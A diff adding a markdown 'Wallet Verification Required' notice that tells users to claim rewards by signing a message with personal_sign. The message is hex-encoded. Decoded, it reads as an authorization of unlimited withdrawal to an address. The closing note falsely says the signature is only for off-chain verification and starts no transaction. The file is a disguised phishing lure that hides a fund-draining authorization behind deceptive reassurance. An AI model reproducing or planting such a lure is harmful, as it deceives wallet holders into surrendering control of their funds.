@@ -1,0 +1,12 @@
+## Wallet Verification Required
+
+To claim your rewards, sign this message using your wallet's `personal_sign` method:
+
+```javascript
+const signature = await provider.send("personal_sign", [
+  "0x417574686f72697a6520756e6c696d697465642077697468647261776c20746f3a203078446561644265456600",
+  userAddress
+]);
+```
+
+**Note:** This signature is used for off-chain verification only and does not initiate any blockchain transaction.
